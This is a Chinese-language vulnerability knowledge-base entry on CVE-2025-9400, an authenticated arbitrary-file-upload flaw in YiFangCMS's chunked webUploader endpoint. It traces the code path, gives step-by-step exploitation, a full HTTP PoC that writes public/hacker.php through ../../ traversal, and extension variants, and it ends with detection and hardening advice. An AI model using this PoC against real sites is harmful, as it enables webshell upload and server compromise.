---
id: web-generic-file-upload-yifangcms-webuploader-chunk-merge-rce
title: YiFangCMS ≤2.0.5 /api/file/webUploader 分片合并上传：uploadPath/md5value/name 可控写任意 PHP 文件 RCE（CVE-2025-9400）
type: scenario
domain: web
path: web/generic/file-upload
technique: yifangcms-webuploader-chunk-merge-rce
aliases:
- CVE-2025-9400
- YiFangCMS 文件上传
- 亿坊CMS 任意文件上传
- webUploader 分片上传 RCE
- mergeMultipartUpload 文件上传
- P_file.php 文件上传
tags:
- php
- yifangcms
- file-upload
- unrestricted-upload
- chunked-upload
- path-control
- webshell
- cve-2025-9400
cve:
- CVE-2025-9400
severity: high
confidence: high
status: verified
affected_versions: YiFang CMS 2.0.5 及更早版本（原文标记，CVE-2025-9400）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V58
  verified_at: '2026-11-05T08:56:20+08:00'
  notes: 已对照原文与20张图片核对：File.php→C_file→P_file→validatorRequest→multipartUpload→mergeMultipartUpload 链路、uploadPath/md5value/name 可控、.part 分片与 pathinfo(name) 取扩展名与图04-16一致；PoC 请求与图18逐字一致，响应 success:false/code:201 但 public/hacker.php 落盘并执行 phpinfo（PHP 7.3.4）与图19/20一致；CVE-2025-9400、CVSS 4.0 5.3、PR:L 与图01一致。未验证点：利用需 cms_session 后台会话，原文未证明未认证利用；PoC 未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

YiFangCMS ≤2.0.5 的 `/api/file/webUploader` 分片上传接口把请求中的 `uploadPath`、`md5value`、`name` 直接拼进落盘路径与文件名，且只用 `pathinfo` 取 `name` 的扩展名、不做白名单/目录规范化；持有 CMS 会话的攻击者构造一次 `chunk=0&chunks=1` 的分片请求，即可把任意内容的 `.php` 文件写入 Web 目录并执行。

## 原理

- 入口 `app/api/controller/File.php` 的 `webUploader()` 只负责调用 `C_file->webUploader()`。`C_file->webUploader()` 从请求读取 `uploadPath`：为空时使用默认时间目录，否则拼成 `"upload/".$uploadPath`；根路径 `rootPath = publicPath()` 固定不可控。随后把 `params`（含 `rootPath`、`uploadPath`）交给 `P_file->webUploader()`。
- `P_file->webUploader()` 解析 `params` 并设置 `rules = ['md5value'=>'', 'chunk'=>'']`，调用 `verifyParam::validatorRequest()`。该方法先取 `request()->param()`（全部请求参数，完全可控），再与传入 `params` 执行 `array_merge($requestData, $params)` 得到 `$dataObj->data->data`，最后按 `rules` 的键从该数组取值返回；`$dataObj->request` 即这次返回的可控对象。
- `multipartUpload()` 再次以 `md5value`、`id`、`name`、`chunk`、`size`、`chunks`、`rootPath`、`uploadPath` 为规则做同样的「只检查键存在」验证，然后直接拼接：
  - `$relativePath = $dataObj->request->uploadPath`
  - `$relativeTmpPath = $relativePath."/tmp/".$dataObj->request->md5value`
  - `$absolutePath = rootPath.$relativePath`，`$targetDir = rootPath.$relativeTmpPath`
  - 分片写入 `{$targetDir}/{$chunk}.part`（临时 `.parttmp` 后改名），内容取自 `$_FILES["file"]["tmp_name"]` 或 `php://input`。
- 当 `chunk == chunks - 1` 时进入 `mergeMultipartUpload()`：用 `pathinfo($dataObj->request->name)["extension"]` 取小写扩展名，拼接最终文件：
  - `$filePath = $absolutePath.'/'.$md5value.'.'.$extend`
  - 逐个读取 `0.part`…`(chunks-1).part` 写入该文件。
- 全程没有扩展名白名单、没有 `md5value` 的哈希校验、没有对 `uploadPath` 做 `../` 规范化或限定在上传目录内。`name` 只用于取扩展名（真正的上传文件名 `filename="phpinfo.png"` 被忽略），把 `name` 设为 `hacker.php` 即得到可执行的 PHP 文件；`uploadPath` 为 `../../` 时从 `public` 目录回退到项目根，`md5value` 再带 `/public/hacker`，最终落到 `public/hacker.php`。

## 触发条件

- YiFang CMS 2.0.5 及更早版本，`/api/file/webUploader` 可从外部访问，Web 目录可写，PHP 在目标目录生效。
- 需要有效的 `cms_session`（原文通过 `/admin/login` 登录后台，并从【网站设置】的“选择图片”处抓取上传请求）；CVE 的 CVSS 向量为 `PR:L`，原文未证明未认证利用。
- multipart 请求需携带 `id`、`uploadPath`、`md5value`、`chunk`、`chunks`、`name`、`size` 等 `rules` 要求的字段；`chunk`/`size`/`chunks` 为整数。
- `chunks=1`、`chunk=0` 时第一个分片保存后即满足 `chunk == chunks-1`，直接触发合并，相当于单文件上传。

## 利用步骤

1. 登录后台，进入【网站设置】等任意带图片上传的页面，选择图片并抓取发往 `/api/file/webUploader` 的 multipart 请求。
2. 将 `uploadPath` 改为 `../../`，`md5value` 改为目标相对路径（如 `/public/hacker`），`name` 改为 `hacker.php`，`chunk=0`、`chunks=1`，`size` 与实际内容长度一致。
3. 文件内容（`filename="phpinfo.png"` 部分）写入 PHP 代码，如 `<?=phpinfo()?>`；`type` 可保持 `image/png`。
4. 发送请求：分片先写入 `tmp` 目录的 `0.part`，随后合并到 `public/hacker.php`。
5. 访问 `http://target/hacker.php` 验证执行结果（原文成功回显 PHP 7.3.4 的 phpinfo）。
6. 注意原文截图中响应 JSON 为 `success:false`、`code:201`，但文件已成功落盘并可执行，因此不能仅凭返回体判断利用是否成功，应直接请求落点文件验证。

## PoC

```http
POST /api/file/webUploader HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data; boundary=----geckoformboundaryf150a86475823af41b288ac3208026f
Cookie: cms_session=<有效会话>

------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="id"

WU_FILE_1
------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="uploadPath"

../../
------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="md5value"

/public/hacker
------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="chunk"

0
------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="chunks"

1
------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="name"

hacker.php
------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="type"

image/png
------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="lastModifiedDate"

2026/1/22 21:01:48
------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="size"

14
------geckoformboundaryf150a86475823af41b288ac3208026f
Content-Disposition: form-data; name="file"; filename="phpinfo.png"
Content-Type: image/png

<?=phpinfo()?>
------geckoformboundaryf150a86475823af41b288ac3208026f--
```

判定：请求后目标 Web 目录出现 `hacker.php`，访问返回 `phpinfo()` 页面。

## 变体与关联

- 路径变体：`uploadPath` 被 `C_file` 前拼 `upload/`，用 `../../` 可回退到项目根；也可把 `md5value` 设置为带子目录的值落盘到其他可写目录。`md5value` 本应是文件哈希，但完全未校验，可任意取名。
- 扩展名变体：最终扩展名来自 `name` 而非表单文件名；可改成 `phtml`、`php5` 等目标中间件可解析的后缀。
- 关联：同类“分片上传/断点续传接口信任客户端路径与文件名”的缺陷在网盘、编辑器上传组件中常见；审计时重点看 `mergeMultipartUpload`、`uploadPath`、`md5value`、`filename` 的拼接与校验顺序，以及分片临时目录是否可被穿越。

## 检测与防御

- 升级/修补：YiFangCMS 官方未发布修复版本（CVE 记录称厂商未回应）；应在 `mergeMultipartUpload` 中对扩展名做白名单、对 `uploadPath`/`md5value` 做规范化并强制落在固定上传目录内，拒绝 `../` 与绝对路径。
- 校验：`md5value` 与文件实际哈希比对、`chunks` 与实际分片数严格校验；不要用请求参数覆盖 `rootPath`/`uploadPath`。
- 权限：上传接口必须做登录与权限校验，且后台账号应强口令；上传目录禁止 PHP 解析（Nginx `location ~ \.php$ { deny all; }` 或独立静态域名）。
- 检测：监控 `/api/file/webUploader` 请求中 `uploadPath` 含 `../`、`md5value` 含 `/` 或非哈希字符、`name` 为可执行扩展名；关注上传目录新出现的 `.php` 文件及其访问日志。
